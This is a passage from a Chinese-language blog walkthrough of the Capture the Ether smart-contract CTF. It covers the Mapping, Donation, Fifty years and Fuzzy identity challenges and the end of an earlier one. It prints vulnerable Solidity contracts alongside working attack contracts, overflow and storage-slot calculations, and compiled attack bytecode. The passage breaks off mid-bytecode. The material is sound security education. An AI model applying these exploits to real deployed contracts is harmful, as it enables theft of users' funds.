&gt; 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; penalty is what&#39;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM">Smooth Criminal</a>.</p><p><strong>解题：</strong></p><p>题目设置了一个十年后才能取出 eth 的合约， 要求我们提前取出所有的 Balance 。重点在  <code>collectPenalty</code> 函数上。</p><p>如果我们能使得 <code>withdrawn &gt; 0</code>  成立， 则可以取出所有的恶 balance , 我们会注意到   <code>startBalance - address(this).balance</code>  存在溢出， 但是条件得是 <code>startBalance</code>  小于 <code>address(this).balance</code> 。 </p><p>这里涉及到一个知识点：</p><p> <code>SELFDESTRUCT</code> 函数可以强制发送 ETH：</p><p><code>SELFDESTRUCT</code>  是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的balance发送给参数所指定的地址，比较特殊的是这笔ether的发送将无视合约的fallback函数，所以它是强制性的 。</p><p>攻击合约代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">function ForceAttack(address target) public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png"></a></p><p>最后调用 <code>collectPenalty</code>  函数即可。</p><h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4. Mapping"></a>4. Mapping</h3><p><strong>题目描述:</strong></p><p>MATH: 750 POINTS</p><p><a href="https://capturetheether.com/challenges/math/mapping/#">Begin Challenge</a></p><p>Who needs <code>mapping</code>s? I’ve created a contract that can store key/value pairs using just an array.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        &#x2F;&#x2F; Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;&#x3D; key) &#123;</span><br><span class="line">            map.length &#x3D; key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=A259WnFMRXI">Map To My Heart</a>.</p><p><strong>解题：</strong></p><p>题目设置了 一个 map ， 我们可以对 map 进行操作， 要求将 <code>isComplete</code> 设置为 True 即可。 感觉就是溢出 map 的空间，覆盖到 <code>isComplete</code>  的位置即可。</p><p>通过了解，我们可以知道动态数组，其在声明中所在位置决定的存储位里存放的是其长度，而其中的变量的存储位则是基于其长度所在的存储进行，这部分的详细内容可以参见此处一篇翻译文章<a href="https://segmentfault.com/a/1190000013791133">了解以太坊智能合约存储</a></p><p>solidity的storage slot存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">slot 0: isComplete</span><br><span class="line">slot 1: map.length</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>动态数组内变量所在的存储位的计算公式即为</p><blockquote><p>keccak256(slot) + index</p></blockquote><p>map.length = key + 1;<br>当map.length溢出会回绕到slot 0 即可完成isComplete的覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; binascii.unhexlify(&#39;%064x&#39; % 1)</span><br><span class="line">&gt;&gt;&gt; Web3.keccak(a)</span><br><span class="line">HexBytes(&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则在 <code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>  位置设置为 1 即可。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png"></a></p><h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5. Donation"></a>5. Donation</h3><p><strong>题目描述：</strong></p><p>A candidate you don’t like is accepting campaign contributions via the smart contract below.</p><p>To complete this challenge, steal the candidate’s ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        &#x2F;&#x2F; amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale &#x3D; 10**18 * 1 ether;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; etherAmount &#x2F; scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp &#x3D; now;</span><br><span class="line">        donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=_AUXpnB065o">Space Force</a>.</p><p><strong>解题：</strong></p><p>这也是一个变量覆盖题目。  Struct在函数内非显式地初始化的时候会使用storage存储而不是memory。具体讲就是 <code>donate()</code> 中 <code>donation</code> 定义时未指定引用，默认指向 slot0 。 因此我们可覆盖solt 0和slot 1处1存储的状态变量，恰好solt 1存储的即为owner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br><span class="line">donation.timestamp &#x3D; now;</span><br><span class="line">donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">now覆盖slot(0) etherAmount覆盖slot(1) 利用etherAmount覆盖owner</span><br></pre></td></tr></table></figure><p>我们需要将 owner 覆盖为我们的账户， 然后将 balance 取出。</p><p>攻击： 设置 value 满足要求，即  <code>address // 10**36</code> , 设置 etherAmount 的值为我的地址</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png"></a></p><p>攻击后：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png"></a></p><p>这样我就可以将 balance 全部取出了。</p><h3 id="6-Fifty-years"><a href="#6-Fifty-years" class="headerlink" title="6. Fifty years"></a>6. Fifty years</h3><p><strong>题目描述：</strong></p><p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p><p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        owner &#x3D; player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;&#x3D; head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            &#x2F;&#x2F; Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution &#x3D; queue[index];</span><br><span class="line">            contribution.amount +&#x3D; msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; Append a new contribution. Require that each contribution unlock</span><br><span class="line">            &#x2F;&#x2F; at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;&#x3D; queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount &#x3D; msg.value;</span><br><span class="line">            contribution.unlockTimestamp &#x3D; timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        require(now &gt;&#x3D; queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total &#x3D; 0;</span><br><span class="line">        for (uint256 i &#x3D; head; i &lt;&#x3D; index; i++) &#123;</span><br><span class="line">            total +&#x3D; queue[i].amount;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Move the head of the queue forward so we don&#39;t have to loop over</span><br><span class="line">        &#x2F;&#x2F; already-withdrawn contributions.</span><br><span class="line">        head &#x3D; index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY">100 Years</a>. I guess just listen to half of it.</p><p><strong>解题：</strong></p><p>通过前面几天题，我可以知道以下暂时可以得到信息：</p><ol><li><p>函数里使用了storage存储来初始化一个contribution结构体， 因此我们可以覆盖 queue 的长度以及 head 的值。</p><pre><code>  msg.value覆盖slot(0) -&gt; queue.length  timestamp覆盖slot(1) -&gt; head</code></pre></li><li><p>溢出漏洞： <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code></p><p>queue 的长度可控， 动态数组queue 的变量所在的存储位计算规则为 <code>keccak256(slot) + index * elementsize</code> ,  <code>elementsize</code>  即为结构体Contribution的size</p></li></ol><p>利用思路：</p><ol><li><p>启动合约，此时 queue.length =1， head = 0</p></li><li><p>调用 <code>upsert(1, 2**256-24*60*60)</code>  通过溢出绕过 <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code> 检查，即 2**256 + 24 * 60 * 60 = 0；</p><p>此时 queue.length = 1 &amp; head = 2*<em>256-24</em>60*60</p></li><li><p>再调用一次 upsert(2, 0) , 调用后, queue.length = 2 &amp; head = 0</p></li><li><p>最后取出所有 balance <code>withdraw(2)</code></p></li></ol><p>step1:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png"></a></p><p>step: 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png"></a></p><p>然后在执行withraw 的时候发现失败了，通过调试以及查阅资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contribution的amount值并不是我们传递的msg.value的值，在其基础上还加了1.开始我也不太明白，后来debug发现原来queue.length也是msg.value+1，因为二者共用一块存储，应该是queue.length增加时也修改了amount的值，至于此处queue.length为何+1，则是因为queue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作</span><br><span class="line"></span><br><span class="line">这样一切就解释的通了，关键就是这里amount进行了+1，所以在withdraw是所统计的total事实上是大于合约所拥有的balance，所以transfer无法执行，这一点确实有点难到我了，必须想个办法抵消这一步+1的操作</span><br><span class="line"></span><br><span class="line">很快，我意识到我可以利用value来覆盖已有的contribution，既然发1 wei会加1，那我发两次，这样得到的amount就是2，也就是我实际发送的wei数目，所以把上面那两步写入操作都改成1 wei下的操作即可 。</span><br></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><p><a href="https://www.anquanke.com/post/id/153375#h3-11">capture the ether write up(warmup and Math) - 安全客，安全资讯平台 (anquanke.com)</a></p><h2 id="Account"><a href="#Account" class="headerlink" title="Account"></a>Account</h2><h3 id="1-Fuzzy-identity"><a href="#1-Fuzzy-identity" class="headerlink" title="1. Fuzzy identity"></a>1. Fuzzy identity</h3><p><strong>题目描述：</strong></p><p>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:</p><ol><li>I always use a wallet contract that returns “smarx” if you ask its <code>name</code>.</li><li>Everything I write has bad code in it, so my address always includes the hex string <code>badc0de</code>.</li></ol><p>To complete this challenge, steal my identity!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() &#x3D;&#x3D; bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr &#x3D; bytes20(_addr);</span><br><span class="line">        bytes20 id &#x3D; hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask &#x3D; hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask &#x3D;&#x3D; id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;&#x3D; 4;</span><br><span class="line">            id &lt;&lt;&#x3D; 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ">Research Me Obsessively</a>.</p><p><strong>解题：</strong></p><p>题目要求：</p><ol><li><code> IName(addr).name() == bytes32(&quot;smarx&quot;);</code></li><li>地址中要存在  <code>badc0de</code></li></ol><p>通过查阅资料可以知道：</p><p>参考黄皮书公式(81)，部署合约时，目标地址有两种计算方式，分别为 <code>CREATE</code> 和 <code>CREATE2</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png"></a></p><p>我们通过 <code>CREATE2</code> 爆破salt计算合约地址，包含badc0de即可</p><ol><li>部署攻击合约的部署合约利用create2获取包含特定字符的攻击合约地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.12;</span><br><span class="line">contract FuzzyIdentitySolverDeployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code, uint256 salt) public</span><br><span class="line">returns(address) &#123;</span><br><span class="line"></span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line"></span><br><span class="line">          addr :&#x3D; create2(0, add(code, 0x20), mload(code), salt)</span><br><span class="line">          if iszero(extcodesize(addr)) &#123;</span><br><span class="line"></span><br><span class="line">            revert(0, 0)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署上述合约并获取合约地址： </p><ol start="2"><li>编译攻击合约代码， 并获取攻击合约代码的 bytecode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IFuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function authenticate() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function name() public pure returns (bytes32) &#123;</span><br><span class="line"></span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public &#123;</span><br><span class="line">        IFuzzyIdentityChallengeSolver(_addr).authenticate();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;linkReferences&quot;</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">&quot;object&quot;</span>: <span class="string">&quot;608060405234801561001057600080fd5b5061019a806100206000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610084575b600080fd5b34801561005d57600080fd5b506100666100c7565b60405180826000191660001916815260200191505060405180910390f35b34801561009057600080fd5b506100c5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ef565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050505600a165627a7a723058208dfe2548775f3de8273867b8111a10cf9a9ad2fbde6b7c8d41ececc20f7367380029&quot;</span>,</span><br><span class="line"><span class="attr">&quot;opcodes&quot;</span>: <span class="string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x84 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH32 0x736D617278000000000000000000000000000000000000000000000000000000 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x380C7A67 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 DUP14 INVALID 0x25 0x48 PUSH24 0x5F3DE8273867B8111A10CF9A9AD2FBDE6B7C8D41ECECC20F PUSH20 0x6738002900000000000000000000000000000000 